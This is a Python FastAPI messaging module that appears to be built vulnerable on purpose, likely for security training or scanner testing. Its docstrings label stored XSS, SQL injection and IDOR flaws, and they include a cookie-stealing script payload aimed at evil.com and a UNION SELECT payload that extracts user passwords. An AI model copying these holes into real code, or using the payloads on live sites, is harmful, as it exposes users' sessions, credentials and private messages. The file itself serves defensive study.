"""
Messaging endpoints.
VULNERABILITIES: Stored XSS, IDOR, SQL injection in search.
"""
import logging
from typing import Optional
from fastapi import APIRouter, HTTPException, Depends

from app.core.database import get_db
from app.core.dependencies import get_current_user
from app.models.schemas import MessageCreate

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/messages", tags=["Messages"])


@router.post("/", status_code=201)
def send_message(msg: MessageCreate, current_user: dict = Depends(get_current_user)):
    """
    Send a message.
    MAJOR — CWE-79 (Stored XSS): content stored raw without sanitization.
    If rendered in a browser without escaping, executes arbitrary JS.
    Payload: content = "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
    """
    db = get_db()
    cur = db.execute(
        "INSERT INTO messages (sender_id,receiver_id,content) VALUES (?,?,?)",
        (current_user["user_id"], msg.receiver_id, msg.content)  # raw, unsanitized
    )
    db.commit()
    db.close()
    return {"message_id": cur.lastrowid, "content": msg.content}  # echoed back unescaped


@router.get("/")
def list_messages(search: Optional[str] = None, current_user: dict = Depends(get_current_user)):
    """
    CRITICAL — CWE-89: search injected into raw SQL.
    CRITICAL — CWE-639: returns ALL messages, not just current user's.
    Payload: search = "' UNION SELECT id,username,password,role,phone,0,0 FROM users --"
    """
    db = get_db()
    if search:
        query = f"SELECT * FROM messages WHERE content LIKE '%{search}%'"  # CWE-89
        rows = db.execute(query).fetchall()
    else:
        # CWE-639: should filter by sender_id/receiver_id = current_user["user_id"]
        rows = db.execute("SELECT * FROM messages").fetchall()
    db.close()
    return [dict(r) for r in rows]


@router.get("/{message_id}")
def get_message(message_id: int, current_user: dict = Depends(get_current_user)):
    """
    MAJOR — CWE-639 (IDOR): no ownership check.
    Any user can read any private message by guessing message_id.
    """
    db = get_db()
    row = db.execute("SELECT * FROM messages WHERE id=?", (message_id,)).fetchone()
    db.close()
    if not row:
        raise HTTPException(404, "Message not found")
    # Missing: verify row["sender_id"] or row["receiver_id"] == current_user["user_id"]
    return dict(row)
